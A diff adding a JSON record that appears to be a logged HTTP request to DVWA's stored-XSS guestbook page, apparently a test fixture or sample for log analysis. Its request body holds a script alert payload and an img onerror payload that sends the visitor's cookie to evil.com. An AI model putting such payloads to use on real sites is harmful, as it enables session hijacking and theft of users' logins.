@@ -1,0 +1,7 @@
+{
+  "body_bytes": "249086",
+  "method": "GET",
+  "path": "/DVWA/vulnerabilities/xss_s/",
+  "protocol": "HTTP/1.1",
+  "request_body": "txtName=<script>alert('XSS')</script>&mtxMessage=<img src=\"\" onerror=\"this.src='http://evil.com/log.php?cookie='+document.cookie\">&btnSign=Sign Guestbook"
+}
